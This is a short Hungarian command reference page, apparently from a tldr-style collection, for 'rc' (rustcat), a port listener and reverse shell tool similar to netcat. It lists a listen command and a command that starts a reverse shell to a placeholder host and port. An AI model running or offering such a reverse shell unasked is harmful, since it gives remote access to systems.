# rc

> Egy modern, egyszerű port listener & reverse shell. Hasonló a `nc`-hoz. További információ: [https://github.com/robiot/rustcat/wiki/Basic-Usage.](https://github.com/robiot/rustcat/wiki/Basic-Usage)

- Egy adott porton való figyelés elindítása:

`rc -lp {{port}}`

- Fordított héj indítása:

`rc {{host}} {{port}} -r {{shell}}`
